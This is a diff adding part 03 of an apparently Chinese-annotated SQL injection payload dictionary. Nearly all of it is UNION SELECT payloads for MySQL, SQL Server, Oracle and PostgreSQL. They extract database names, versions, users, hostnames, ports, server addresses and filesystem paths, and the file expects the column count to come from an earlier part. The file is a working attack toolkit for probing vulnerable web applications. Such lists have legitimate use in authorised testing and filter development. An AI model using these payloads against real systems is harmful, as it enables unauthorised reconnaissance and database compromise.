@@ -1,0 +1,126 @@
+# ============================================================
+# SQL Injection Payload Dictionary — 03 数据库信息探测类
+# 用途: 获取数据库名称、版本、用户、路径等元信息
+# 适用: 覆盖 MySQL / SQL Server / Oracle / PostgreSQL
+# 注意: 使用前需先通过 02 知道准确列数，替换 N 为实际列数
+#       例如 3 列时: UNION SELECT 1,database(),3--
+# ============================================================
+
+# ========== MySQL / MariaDB ==========
+
+# 当前数据库名
+UNION SELECT 1,database(),N--
+UNION SELECT 1,schema(),N--
+
+# 版本
+UNION SELECT 1,version(),N--
+UNION SELECT 1,@@version,N--
+
+# 当前用户
+UNION SELECT 1,user(),N--
+UNION SELECT 1,current_user(),N--
+UNION SELECT 1,system_user(),N--
+UNION SELECT 1,session_user(),N--
+
+# 操作系统
+UNION SELECT 1,@@version_compile_os,N--
+
+# 主机名
+UNION SELECT 1,@@hostname,N--
+
+# 端口
+UNION SELECT 1,@@port,N--
+
+# 路径信息
+UNION SELECT 1,@@datadir,N--
+UNION SELECT 1,@@basedir,N--
+UNION SELECT 1,@@plugin_dir,N--
+UNION SELECT 1,@@tmpdir,N--
+UNION SELECT 1,@@secure_file_priv,N--
+
+# 全局变量
+UNION SELECT 1,@@max_allowed_packet,N--
+UNION SELECT 1,@@wait_timeout,N--
+UNION SELECT 1,@@character_set_database,N--
+
+# 数据库编码
+UNION SELECT 1,@@collation_database,N--
+
+# 一次性获取多个（CONCAT_WS）
+UNION SELECT 1,CONCAT_WS('|',database(),version(),user(),@@version_compile_os),N--
+
+# 格式化输出
+UNION SELECT 1,CONCAT_WS(0x7e,database(),version(),user()),N--
+
+# ========== SQL Server ==========
+
+# 版本
+UNION SELECT 1,@@version,N--
+
+# 当前数据库
+UNION SELECT 1,DB_NAME(),N--
+
+# 其他数据库
+UNION SELECT 1,DB_NAME(1),N--
+UNION SELECT 1,DB_NAME(2),N--
+
+# 当前用户
+UNION SELECT 1,USER_NAME(),N--
+UNION SELECT 1,SYSTEM_USER,N--
+
+# 服务器信息
+UNION SELECT 1,@@SERVERNAME,N--
+UNION SELECT 1,@@SERVICENAME,N--
+UNION SELECT 1,@@LANGUAGE,N--
+
+# 客户端
+UNION SELECT 1,HOST_NAME(),N--
+
+# 多信息合并
+UNION SELECT 1,@@version + '|' + DB_NAME() + '|' + USER_NAME(),N--
+
+# ========== Oracle ==========
+# 注意: Oracle 必须带 FROM dual！
+
+# 版本（注意 v$version 返回多行，需 rownum=1）
+UNION SELECT 1,(SELECT banner FROM v$version WHERE rownum=1),N FROM dual--
+
+# 当前数据库
+UNION SELECT 1,(SELECT ora_database_name FROM dual),N FROM dual--
+
+# 当前用户
+UNION SELECT 1,(SELECT user FROM dual),N FROM dual--
+
+# 全局数据库名
+UNION SELECT 1,(SELECT global_name FROM global_name),N FROM dual--
+
+# 语言
+UNION SELECT 1,(SELECT language FROM v$nls_parameters WHERE parameter='NLS_LANGUAGE'),N FROM dual--
+
+# 实例名
+UNION SELECT 1,(SELECT instance_name FROM v$instance),N FROM dual--
+
+# 多信息合并
+UNION SELECT 1,(SELECT ora_database_name FROM dual) || '|' || (SELECT user FROM dual),N FROM dual--
+
+# ========== PostgreSQL ==========
+
+# 版本
+UNION SELECT 1,version(),N--
+
+# 当前数据库
+UNION SELECT 1,current_database(),N--
+
+# 当前用户
+UNION SELECT 1,current_user,N--
+UNION SELECT 1,user,N--
+
+# 当前模式
+UNION SELECT 1,current_schema(),N--
+
+# 服务器信息
+UNION SELECT 1,inet_server_addr(),N--
+UNION SELECT 1,inet_server_port(),N--
+
+# 多信息合并
+UNION SELECT 1,current_database() || '|' || current_user || '|' || version(),N--
